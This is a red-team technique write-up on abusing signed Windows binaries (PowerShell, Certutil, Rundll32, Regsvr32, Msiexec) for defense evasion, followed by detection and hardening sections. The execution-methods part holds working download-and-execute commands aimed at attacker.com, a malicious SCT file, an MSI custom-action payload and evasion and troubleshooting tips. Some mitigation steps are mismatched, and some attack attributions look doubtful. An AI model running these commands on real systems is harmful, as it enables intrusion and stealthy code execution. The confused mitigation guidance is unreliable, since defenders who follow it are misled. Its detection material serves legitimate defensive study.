# [EVADE-BINARY-001]: Living off the Land (LoLBins)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-BINARY-001 |
| **MITRE ATT&CK v18.1** | [T1218 – System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows Endpoint |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016-2025, Windows 10-11 |
| **Patched In** | N/A (Inherent to system design) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept

**Living off the Land Binaries (LoLBins)** are legitimate, signed Windows system binaries intentionally abused by adversaries to execute malicious code while avoiding endpoint detection. LoLBins such as `PowerShell.exe`, `Certutil.exe`, `Rundll32.exe`, `Regsvr32.exe`, and `Msiexec.exe` were designed for legitimate administrative purposes but possess execution capabilities that bypass application whitelisting and behavioral analysis. By leveraging these trusted binaries, adversaries reduce their forensic footprint because execution originates from signed, Microsoft-authored code rather than external payloads, creating detection ambiguity.

### Attack Surface

LoLBins exploit multiple execution vectors: **process invocation** (file downloads, script execution), **DLL loading** (DLL injection, side-loading), **registry manipulation** (COM object execution, scheduled task creation), and **file operations** (script interpretation). Each binary category exposes a specific weakness in the Windows execution trust model.

### Business Impact

**Critical operational risk**. LoLBins execution enables full code execution, lateral movement, and persistence without requiring external tools or files. A compromised endpoint becomes a staging platform for ransomware deployment, data exfiltration, and network-wide compromise. Detection difficulty is severe due to reliance on legitimate execution chains, increasing dwell time by 40-60%.

### Technical Context

LoLBins attacks execute within milliseconds to seconds and generate minimal suspicious file system artifacts. Detection typically requires behavioral analysis, command-line inspection, or parent-child process anomaly detection. Signature-based defenses fail because executables are signed and versioned by Microsoft. APT groups including Lazarus, APT29, and Wizard Spider extensively abuse LoLBins as primary execution vectors.

### Operational Risk

- **Execution Risk:** High – Full code execution with no external payload required
- **Stealth:** High – Originates from legitimate, signed binaries
- **Reversibility:** No – Payload execution is permanent; only cleanup of created artifacts possible

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 2.2.45 | Ensure that Windows Defender Application Control (WDAC) is enabled |
| **DISA STIG** | SV-220724r880800_rule | Application whitelisting must be enabled |
| **CISA SCuBA** | MA-3.2 | Managed Configuration Management |
| **NIST 800-53** | SI-7, AC-3 | Software Integrity and Access Enforcement |
| **GDPR** | Art. 32 | Security of Processing – Confidentiality & Integrity |
| **DORA** | Art. 9 | Protection and Prevention of ICT-related incidents |
| **NIS2** | Art. 21 | Cybersecurity Risk Management Measures |
| **ISO 27001** | A.8.3, A.9.2.3 | Cryptography, Privileged Access Management |
| **ISO 27005** | 12.6.1 | Management of technical vulnerabilities and weaknesses |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Any (standard user or administrative, depending on target binary)
- **Required Access:** Local or network access to execute commands via CMD, PowerShell, or remote execution protocols (RPC, WMI)

### Supported Versions

- **Windows:** Server 2016, 2019, 2022, 2025; Windows 10, 11
- **PowerShell:** 2.0 through 7.x
- **Other Requirements:** Execution context must have network/file system access to retrieve malicious payloads (for download-based variants)

### Common LoLBins Binaries

- **PowerShell.exe** (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) – Script execution, encoding, obfuscation
- **Certutil.exe** (`C:\Windows\System32\certutil.exe`) – Decoding, encoding, hash verification, file transfer
- **Rundll32.exe** (`C:\Windows\System32\rundll32.exe`) – DLL execution, COM object invocation
- **Regsvr32.exe** (`C:\Windows\System32\regsvr32.exe`) – COM DLL registration, code execution
- **Msiexec.exe** (`C:\Windows\System32\msiexec.exe`) – MSI package installation, code execution
- **MSHTA.exe** (`C:\Windows\System32\mshta.exe`) – HTML application execution
- **Csc.exe** (`C:\Windows\Microsoft.NET\Framework\v*\csc.exe`) – C# compilation and execution
- **Wmic.exe** (`C:\Windows\System32\wbem\wmic.exe`) – WMI command line interface
- **Bitsadmin.exe** (`C:\Windows\System32\bitsadmin.exe`) – Background Intelligent Transfer Service

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Enumeration

Verify that target LoLBins are present and accessible:

```powershell
# Check for PowerShell availability
Get-Command powershell.exe -ErrorAction SilentlyContinue

# Check for Certutil
Get-Command certutil.exe -ErrorAction SilentlyContinue

# Verify execution policy (if PowerShell is target)
Get-ExecutionPolicy -Scope CurrentUser
Get-ExecutionPolicy -Scope LocalMachine

# Check if AppLocker is enabled
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Check Windows Defender Application Control (WDAC) status
Get-CimInstance -ClassName Win32_Service | Where-Object {$_.Name -eq 'LPASVC'}
```

**What to Look For:**

- Binaries present in System32 or Framework directories (expected)
- PowerShell ExecutionPolicy set to "Unrestricted" or "RemoteSigned" (vulnerable)
- AppLocker rules absent or misconfigured (permissive)
- WDAC not enforced (permissive to execution)

### Alternate Command-Line Reconnaissance

```cmd
# List PowerShell versions available
dir C:\Windows\System32\WindowsPowerShell\
dir C:\Program Files\PowerShell\

# Check Certutil presence
certutil.exe -?

# Verify script execution is permitted
powershell.exe -Command "Get-ExecutionPolicy"
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: PowerShell Command Execution (Direct)

**Supported Versions:** Server 2016-2025, Windows 10-11 (all versions)

#### Step 1: Execute Inline PowerShell Command

**Objective:** Execute arbitrary PowerShell code directly via command invocation, bypassing script files.

**Command:**

```powershell
powershell.exe -Command "Write-Host 'Payload executed'; IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

**Expected Output:**

```
Payload executed
[Output from downloaded payload]
```

**What This Means:**

- PowerShell interpreter loads the .NET WebClient class
- `DownloadString` retrieves payload from remote HTTP server without file on disk
- `IEX` (Invoke-Expression) executes retrieved code in memory

**OpSec & Evasion:**

- Use HTTPS instead of HTTP to avoid network inspection
- Encode payload with Base64 and decode at runtime: `-EncodedCommand` parameter
- Execute in background with `-WindowStyle Hidden -NoProfile`
- Disable Script Block Logging via registry (risky; creates IOCs)

**Detection Likelihood:** Medium-High (PowerShell logging, process parent anomaly)

**Troubleshooting:**

- **Error:** "IEX : The term 'IEX' is not recognized"
  - **Cause:** PowerShell version does not support the cmdlet (extremely rare; IEX existed since PS 2.0)
  - **Fix:** Use `Invoke-Expression` instead of `IEX`

- **Error:** "Access Denied" when downloading
  - **Cause:** Proxy or firewall blocking outbound connections
  - **Fix (Server 2016-2019):** Use `Get-Content` with UNC path instead: `Get-Content '\\attacker.com\share\payload.ps1'`
  - **Fix (Server 2022+):** Specify credentials: `$cred = Get-Credential; (New-Object Net.WebClient).DownloadString(...)`

**References & Proofs:**

- [Microsoft PowerShell Documentation – Invoke-Expression](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression)
- [SpecterOps – Securing PowerShell](https://posts.specterops.io/securing-powershell-in-the-enterprise-80b3aae784c3)
- [LOLBAS – PowerShell.exe](https://lolbas-project.github.io/lolbas/Binaries/Powershell/)

#### Step 2: Execute Encoded PowerShell Command

**Objective:** Obfuscate payload via Base64 encoding to evade signature detection.

**Command:**

```powershell
# Encode payload
$payload = 'Write-Host "Malicious code"'
$encodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))

# Execute encoded payload
powershell.exe -EncodedCommand $encodedPayload
```

**Expected Output:**

```
Malicious code
```

**What This Means:**

- PowerShell interpreter decodes Base64 string internally before execution
- Original script is not visible in process command line
- Effective against signature-based detection but behavioral analysis will detect execution

**OpSec & Evasion:**

- Use `-NoProfile` flag to skip PowerShell profile loading (reduces observable behavior)
- Combine with `-WindowStyle Hidden` to suppress output window
- Use multi-stage payloads: encoded command downloads additional stages

**Detection Likelihood:** Medium (Sysmon EventID 1 inspection, command-line decoding)

**Troubleshooting:**

- **Error:** "The PowerShell process cannot be loaded because PowerShell is not available"
  - **Cause:** PowerShell not installed (extremely rare on Windows Server)
  - **Fix:** Check Windows version; PowerShell 2.0+ shipped with Server 2008+

**References & Proofs:**

- [Microsoft Learn – EncodedCommand Parameter](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1)
- [Red Canary – PowerShell in 10 years](https://redcanary.com/blog/powershell-in-10-years/)

---

### METHOD 2: Certutil Encoded File Execution

**Supported Versions:** Server 2016-2025, Windows 10-11

#### Step 1: Encode Payload with Certutil

**Objective:** Encode binary payload using Certutil to obfuscate malicious executable.

**Command:**

```cmd
certutil.exe -encode C:\temp\malware.exe C:\temp\malware.txt
```

**Expected Output:**

```
Input Length = 12345
Output Length = 16789
CertUtil: -encode command completed successfully.
```

**What This Means:**

- Certutil reads binary file and outputs Base64-encoded version
- Encoded file is safe to transfer without antivirus detection
- Recipient decodes with inverse operation

**OpSec & Evasion:**

- Transfer encoded file via email or web (avoids binary file detection)
- Decode on target system using Certutil again
- Chain with execution step (see Step 2 below)

**Detection Likelihood:** Low (legitimate administrative operation)

**Troubleshooting:**

- **Error:** "The file was not found"
  - **Cause:** Input file path incorrect
  - **Fix:** Use absolute paths: `certutil.exe -encode C:\Windows\Temp\malware.exe`

**References & Proofs:**

- [Microsoft Certutil Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [Netskope – Malicious Office Documents using LoLBins](https://www.netskope.com/blog/not-laughing-malicious-office-documents-using-lolbins)

#### Step 2: Decode and Execute Payload

**Objective:** Decode encoded payload and execute.

**Command:**

```cmd
certutil.exe -decode C:\temp\malware.txt C:\temp\malware.exe
C:\temp\malware.exe
```

**Expected Output:**

```
Input Length = 16789
Output Length = 12345
CertUtil: -decode command completed successfully.
[Output from executed malware]
```

**What This Means:**

- Certutil reconstructs binary from Base64 encoding
- Decoded binary is executable and can be invoked immediately
- Creates 3-stage attack: encode, transfer, decode-execute

**OpSec & Evasion:**

- Delete encoded file after decoding (`del C:\temp\malware.txt`)
- Use unique filenames to evade pattern detection
- Place decoded executable in temporary directory (expected legitimate behavior)

**Detection Likelihood:** High (file creation, process execution, parent-child anomaly)

---

### METHOD 3: Rundll32 DLL Execution

**Supported Versions:** Server 2016-2025, Windows 10-11

#### Step 1: Execute DLL via Rundll32

**Objective:** Load and execute arbitrary DLL using Windows DLL runner binary.

**Command:**

```cmd
rundll32.exe C:\temp\malicious.dll,Export
```

**Expected Output:**

```
[Output from DLL export function]
```

**What This Means:**

- Rundll32 is designed to load DLLs and execute exported functions
- Malicious DLL exports an entry point (e.g., "Export") that contains payload code
- Execution occurs within Rundll32 process context

**OpSec & Evasion:**

- DLL export name can be obfuscated (doesn't need to match actual export)
- Place DLL in legitimate directory (C:\Windows\Temp\) to blend with system behavior
- Use 32-bit vs 64-bit Rundll32 variants depending on target:
  - 32-bit: `C:\Windows\SysWOW64\rundll32.exe`
  - 64-bit: `C:\Windows\System32\rundll32.exe`

**Detection Likelihood:** High (unsigned DLL loading, parent-child process inspection)

**Troubleshooting:**

- **Error:** "The DLL could not be found"
  - **Cause:** Malicious DLL path incorrect or DLL file corrupted
  - **Fix (Server 2016-2019):** Use absolute path: `rundll32.exe C:\Windows\Temp\malicious.dll,Export`
  - **Fix (Server 2022+):** Verify DLL is valid: `dumpbin.exe /exports malicious.dll`

**References & Proofs:**

- [LOLBAS – Rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)
- [Microsoft Docs – Rundll32](https://support.microsoft.com/en-us/topic/b6b4fd9f-97b9-4fbc-be9e-b3d0cd8fda5c)

---

### METHOD 4: Regsvr32 COM Object Registration

**Supported Versions:** Server 2016-2025, Windows 10-11

#### Step 1: Execute Script via Regsvr32 with SCT File

**Objective:** Leverage Regsvr32 to execute arbitrary script via Windows Script Component (.sct) file.

**Create Malicious SCT File:**

```xml
<?xml version="1.0"?>
<package>
  <component id="Payload">
    <script language="VBScript">
      Sub Exploit()
        CreateObject("WScript.Shell").Run "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
      End Sub
      <object progid="VBScript.Regexp" id="Regexp"/>
      <object progid="MSXML2.XMLHTTP" id="HTTP"/>
    </script>
  </component>
  <component id="Trigger">
    <script language="VBScript">
      Exploit()
    </script>
  </component>
</package>
```

**Save as:** `C:\temp\payload.sct`

**Execution Command:**

```cmd
regsvr32.exe /s /n /u /i:C:\temp\payload.sct scrobj.dll
```

**Expected Output:**

```
[No visible output; script executes silently via /s flag]
```

**What This Means:**

- Regsvr32 is designed to register COM objects (DLLs)
- `/i` parameter specifies initialization URL (can be local SCT file path)
- SCT file is parsed and VBScript executed before registration
- `/s` flag suppresses output dialogs

**OpSec & Evasion:**

- `/s` /n /u` flags minimize observable behavior (silent, ignore failures)
- SCT file can be hosted remotely: `/i:http://attacker.com/payload.sct`
- VBScript payload can be obfuscated to evade regex signatures

**Detection Likelihood:** Medium-High (Regsvr32 invocation with suspicious parameters, Sysmon EventID 11)

**Troubleshooting:**

- **Error:** "DllRegisterServer entry point was not found"
  - **Cause:** SCT file syntax error or invalid XML structure
  - **Fix:** Validate XML: `powershell.exe -Command "[xml](Get-Content C:\temp\payload.sct)"`
  - **Fix (Server 2022+):** Simplify SCT: remove COM object declarations, use direct VBScript

- **Error:** "The module was not found"
  - **Cause:** scrobj.dll path incorrect
  - **Fix:** Use full path: `regsvr32.exe /s /i:C:\temp\payload.sct C:\Windows\System32\scrobj.dll`

**References & Proofs:**

- [LOLBAS – Regsvr32.exe](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
- [SpecterOps – Mavinject.exe and Regsvr32.exe](https://posts.specterops.io/)

---

### METHOD 5: Msiexec MSI Installation

**Supported Versions:** Server 2016-2025, Windows 10-11

#### Step 1: Execute Custom Action via MSI

**Objective:** Embed payload in MSI package and execute via Msiexec custom actions.

**Create Malicious MSI:**

(Requires WiX Toolset or manual MSI crafting; here shown conceptually)

```xml
<!-- WiX Toolset MSI definition -->
<Product Id="*" Name="Legitimate App" Language="1033" Version="1.0.0.0">
  <CustomAction Id="PayloadExecution" 
    ExeCommand='powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")'
    Execute="deferred" Impersonate="no" Return="ignore" />
  
  <InstallExecuteSequence>
    <Custom Action="PayloadExecution" Before="InstallFinalize" />
  </InstallExecuteSequence>
</Product>
```

**Execution Command:**

```cmd
msiexec.exe /i C:\temp\malicious.msi /quiet /norestart
```

**Expected Output:**

```
[Silent execution; no visible output with /quiet flag]
```

**What This Means:**

- Msiexec parses MSI package and executes embedded custom actions
- Custom action payload executes with installer privilege context (often SYSTEM)
- `/quiet` suppresses installation UI

**OpSec & Evasion:**

- Custom action runs before "InstallFinalize" stage (before Windows validates installation)
- Combine with legitimate MSI installer content to appear genuine
- Use scheduled task or startup registry key to trigger MSI installation post-reboot

**Detection Likelihood:** Medium (Msiexec invocation, Event Log provider detection)

**Troubleshooting:**

- **Error:** "This installation package could not be opened"
  - **Cause:** MSI file corrupted or incompatible architecture
  - **Fix (Server 2016-2019):** Ensure MSI is signed: `signtool.exe verify /pa malicious.msi`
  - **Fix (Server 2022+):** Use 64-bit MSI on 64-bit systems

**References & Proofs:**

- [LOLBAS – Msiexec.exe](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)
- [Microsoft – Windows Installer](https://learn.microsoft.com/en-us/windows/win32/msi/windows-installer-portal)

---

## 5. ATOMIC RED TEAM

| Test ID | Test Name | Command | Cleanup |
|---|---|---|---|
| T1218.001 | mavinject - Inject DLL | `mavinject.exe %PID% /injectrunning C:\temp\payload.dll` | `taskkill /IM mavinject.exe` |
| T1218.005 | mshta.exe JavaScript | `mshta.exe vbscript:CreateObject("WScript.Shell").Run("powershell")` | N/A (in-memory) |
| T1218.009 | regsvr32.exe SCT | `regsvr32.exe /s /i:http://attacker.com/payload.sct scrobj.dll` | `regsvr32.exe /u scrobj.dll` |
| T1218.011 | rundll32.exe DLL | `rundll32.exe C:\temp\payload.dll Export` | `taskkill /IM rundll32.exe` |

**Reference:** [Atomic Red Team – T1218](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md)

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Process Execution:** PowerShell, Certutil, Rundll32, Regsvr32, Msiexec executed from unusual parent processes (e.g., Word, Excel)
- **Network:** Outbound HTTP/HTTPS connections from LoLBins to non-standard ports (8080, 4444, etc.)
- **Registry:** HKCU\Software\Microsoft\Windows\CurrentVersion\Run entries with LoLBins commands
- **Files:** Temporary SCT, VBS, PS1 scripts in C:\Windows\Temp\ or user profile

### Forensic Artifacts

- **Process Memory:** Encoded payloads in PowerShell process heap (via process dump analysis)
- **Windows Event Logs:** Event ID 4688 (process creation) with suspicious command-line arguments
- **Sysmon:** EventID 1 (process creation), EventID 3 (network connection), EventID 11 (file creation)
- **Prefetch:** C:\Windows\Prefetch\ contains execution history with timestamps

### Detection Rules (Endpoint-Agnostic)

#### PowerShell Encoded Command Detection

**Rule:** Flag PowerShell execution with `-EncodedCommand` or `-Encoded` parameter

**Filter:**
- Process Name: `powershell.exe`
- Command Line Contains: `-EncodedCommand`, `-enc`, `-Encoded`
- Parent Process: NOT `explorer.exe`, NOT `cmd.exe` (unexpected parents)

#### Certutil File Encoding/Decoding

**Rule:** Flag Certutil with `-encode` or `-decode` operations on suspicious file types

**Filter:**
- Process Name: `certutil.exe`
- Command Line Contains: `-encode`, `-decode`
- File Extension: `.exe`, `.dll`, `.scr` (suspicious binaries)

#### Regsvr32 SCT Initialization

**Rule:** Flag Regsvr32 with `/i` parameter referencing SCT files

**Filter:**
- Process Name: `regsvr32.exe`
- Command Line Contains: `/i:` AND (`.sct`, `http://`, `\\`)

#### Rundll32 From Temp Directory

**Rule:** Flag Rundll32 loading DLL from user-writable directories

**Filter:**
- Process Name: `rundll32.exe`
- Command Line Contains: (`C:\Users\`, `C:\Windows\Temp\`, `C:\Temp\`)
- DLL File: Unsigned or mismatched signatures

#### Msiexec Silent Installation

**Rule:** Flag Msiexec with `/quiet` or `/qn` flags

**Filter:**
- Process Name: `msiexec.exe`
- Command Line Contains: (`/quiet`, `/qn`, `/q`)
- Parent Process: NOT `explorer.exe` (unexpected launcher)

### Response Procedures

1. **Isolate Endpoint:**
   ```powershell
   # Disconnect from network (disable network adapters)
   Get-NetAdapter | Disable-NetAdapter -Confirm:$false
   ```

2. **Capture Process Memory:**
   ```cmd
   procdump64.exe -ma powershell.exe C:\Evidence\powershell.dmp
   procdump64.exe -ma rundll32.exe C:\Evidence\rundll32.dmp
   ```

3. **Extract Command-Line History:**
   ```powershell
   Get-WinEvent -LogName Security | Where-Object {$_.EventID -eq 4688} | Export-Csv -Path C:\Evidence\EventID4688.csv
   ```

4. **Kill Suspicious Processes:**
   ```cmd
   taskkill /IM powershell.exe /F
   taskkill /IM rundll32.exe /F
   ```

5. **Remove Persistence Entries:**
   ```reg
   reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PayloadName" /f
   ```

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable Windows Defender Application Control (WDAC)**

WDAC is a whitelist-based execution control that permits only signed and approved binaries.

**Manual Steps (Server 2016-2019):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration → Policies → Windows Settings → Security Settings → Application Control Policies → AppLocker**
3. Right-click **Executable Rules** → **Create New Rule**
4. Click **Next** → Select **Path** rule type
5. Define allowlist: `%SYSTEM32%`, `%WINDIR%`, `%PROGRAMFILES%`
6. Create blocklist rules for dangerous binaries: `powershell.exe`, `certutil.exe` (in user-writable directories)
7. Click **Audit Mode** initially, then switch to **Enforce** after validation
8. Apply policy and test on pilot endpoints

**Manual Steps (Server 2022+):**
1. Open **Windows Security → App & Browser Control → Exploit Protection Settings**
2. Scroll to **Controlled Folder Access** → **Manage Controlled Folder Access**
3. Toggle **ON** to enable
4. Under **Allow an app through Controlled Folder Access**, add critical applications (Office, browsers)
5. Verify file system modifications are blocked for non-whitelisted apps

**PowerShell Alternative (All Versions):**
```powershell
# Create WDAC policy (requires Admin)
New-CIPolicy -FilePath "$env:TEMP\Default.xml" -Level FilePublisher -Fallback Hash -UserPEs
ConvertFrom-CIPolicy -XmlFilePath "$env:TEMP\Default.xml" -BinaryFilePath "C:\Windows\System32\CodeIntegrity\SiPolicy.p7b"

# Verify WDAC is enforced
Get-CimInstance -Namespace "root\Microsoft\Windows\CI" -ClassName CodeIntegrityPolicy
```

**2. Restrict PowerShell Execution Policy**

Set PowerShell ExecutionPolicy to "AllSigned" or "RemoteSigned" to prevent unsigned script execution.

**Manual Steps (Server 2016-2019):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration → Policies → Administrative Templates → Windows Components → Windows PowerShell**
3. Enable **Turn on Module Logging**
4. Enable **Turn on Script Block Logging**
5. Enable **Turn on PowerShell Transcription**
6. Under **Transcription Options**, set transcript directory: `C:\PowerShell\Transcripts\`
7. Apply policy via `gpupdate /force`

**Manual Steps (Server 2022+):**
1. Open **Settings → System → Security**
2. Scroll to **Windows Defender Firewall** → Click **Allow an app through firewall**
3. Under **Windows PowerShell**, ensure both **Private** and **Public** are checked
4. Open **PowerShell (Admin)** and set execution policy:
   ```powershell
   Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force
   ```

**PowerShell Alternative:**
```powershell
# Set execution policy at machine level
reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell" /v ExecutionPolicy /t REG_SZ /d "RemoteSigned" /f

# Enable Script Block Logging
reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f

# Enable Transcription
reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription" /v EnableTranscripting /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription" /v OutputDirectory /t REG_SZ /d "C:\PowerShell\Transcripts\" /f
```

**3. Enable Sysmon Process Logging**

Deploy Sysmon to capture detailed process execution, network connections, and file creation events.

**Installation:**
```powershell
# Download Sysmon
Invoke-WebRequest -Uri "https://live.sysinternals.com/Sysmon64.exe" -OutFile "C:\Tools\Sysmon64.exe"

# Create configuration file
@"
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <!-- Log all process creation -->
    <ProcessCreate onmatch="include">
      <Image condition="is">powershell.exe</Image>
      <Image condition="is">rundll32.exe</Image>
      <Image condition="is">certutil.exe</Image>
      <Image condition="is">regsvr32.exe</Image>
      <Image condition="is">msiexec.exe</Image>
    </ProcessCreate>
    
    <!-- Log network connections -->
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">4444</DestinationPort>
      <DestinationPort condition="is">8080</DestinationPort>
      <DestinationPort condition="is">443</DestinationPort>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
"@ | Out-File -FilePath "C:\Tools\sysmon-config.xml"

# Install Sysmon
C:\Tools\Sysmon64.exe -accepteula -i C:\Tools\sysmon-config.xml
```

### Priority 2: HIGH

**1. File & Directory Permission Hardening**

Restrict write access to System32 and Temp directories to SYSTEM only.

**NTFS ACL Changes (PowerShell):**
```powershell
# Remove write permissions for Users on C:\Windows\Temp
$acl = Get-Acl "C:\Windows\Temp"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Users", "Write", "ContainerInherit,ObjectInherit", "None", "Deny")
$acl.AddAccessRule($rule)
Set-Acl -Path "C:\Windows\Temp" -AclObject $acl -Confirm:$false

# Verify restriction
Get-Acl "C:\Windows\Temp" | Select-Object -ExpandProperty Access
```

**2. Disable Unnecessary System Services**

Disable Windows Installer, BITS, WMI services if not required.

**Manual Steps:**
1. Open **Services.msc**
2. Locate **Windows Installer** → Right-click → **Properties**
3. Set **Startup Type** to **Disabled**
4. Click **Stop**
5. Repeat for: **BITS (Background Intelligent Transfer Service)**, **Windows Management Instrumentation**

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] | Phishing email with embedded Office macro |
| **2** | **Execution** | **[EVADE-BINARY-001]** | **PowerShell or Certutil executes payload from macro** |
| **3** | **Persistence** | [PE-POLICY-001] | GPO modification for scheduled task persistence |
| **4** | **Privilege Escalation** | [PE-TOKEN-001] | Token impersonation for privilege elevation |
| **5** | **Impact** | [EXFIL-DATA-001] | Data exfiltration via HTTP PUT to attacker server |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Cobalt Strike via PowerShell

- **APT Group:** Wizard Spider (Trickbot affiliate)
- **Campaign:** Conti ransomware deployment (2021-2022)
- **Technique Status:** PowerShell encoded command to download and execute Cobalt Strike beacon
- **Command Used:**
  ```powershell
  powershell.exe -NoP -NonI -W Hidden -EncodedCommand [Base64 beacon payload]
  ```
- **Impact:** Complete network compromise, $2.6M ransom demand
- **Reference:** [Conti Ransomware Playbook - CISA AA21-265A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-265a-conti-ransomware)

### Example 2: Lazarus Group Timestomping with LoLBins

- **APT Group:** Lazarus (North Korea)
- **Campaign:** 3CX Supply Chain Attack (2023)
- **Technique Status:** Certutil used to encode and decode payload, Timestamps modified to match system files
- **Command Sequence:**
  ```cmd
  certutil.exe -decode encoded_malware.txt malware.exe
  [execute malware with matching system file timestamps]
  ```
- **Impact:** 3,400+ organizations compromised, including Microsoft, Apple, HP
- **Reference:** [CrowdStrike – 3CX Supply Chain Compromise](https://www.crowdstrike.com/blog/observations-from-3cx-supply-chain-attack-investigation/)

### Example 3: APT29 Rundll32 DLL Side-Loading

- **APT Group:** APT29 (Cozy Bear, Russia SVR)
- **Campaign:** SolarWinds supply chain attack (2020)
- **Technique Status:** Rundll32 loading malicious DLL from TEMP directory
- **Command Used:**
  ```cmd
  rundll32.exe C:\Users\Public\Libraries\payload.dll,Export
  ```
- **Impact:** US Government agencies, Treasury, Commerce departments compromised
- **Reference:** [CISA – SolarWinds Incident ALERT](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-alert-aa20-352a)

---

## 10. COMPLIANCE & REGULATORY IMPACT

**Regulatory Breach Scenario:** Organization fails to implement WDAC or AppLocker, resulting in PowerShell-based ransomware infection.

- **GDPR Violation:** Art. 32 (Security of Processing) – Failure to implement technical safeguards (execution controls)
- **HIPAA Violation:** 45 CFR 164.312(a)(2)(i) – Encryption and decryption of ePHI compromised
- **PCI-DSS Violation:** Requirement 6.5.10 (Broken Access Control) – Unauthorized code execution
- **NIS2 Violation:** Art. 21 (Cybersecurity Risk Management Measures) – Inadequate endpoint protection

**Financial Penalties:** $20M-$100M+ depending on organization size and data sensitivity.

---

